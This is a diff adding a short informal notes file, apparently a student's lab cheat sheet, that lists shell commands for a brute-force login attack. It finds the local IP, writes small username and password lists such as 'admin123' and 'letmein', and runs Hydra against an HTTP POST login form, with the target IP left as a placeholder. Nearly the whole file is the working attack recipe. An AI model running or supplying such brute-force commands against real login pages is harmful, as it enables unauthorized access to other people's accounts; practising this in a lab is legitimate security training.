@@ -1,0 +1,10 @@
+commands:
+find local ip:
+ip a
+
+make a costume list:
+echo -e "admin\nlyna\nassia" > usernames.txt
+echo -e "admin123\nletmein\nazerty\npassword123\n123456" > passwords.txt (or make it)
+
+hydra:
+hydra -L usernames.txt -P passwords.txt (replace with ur ip address) http-post-form "/:username=^USER^&password=^PASS^:Login failed"
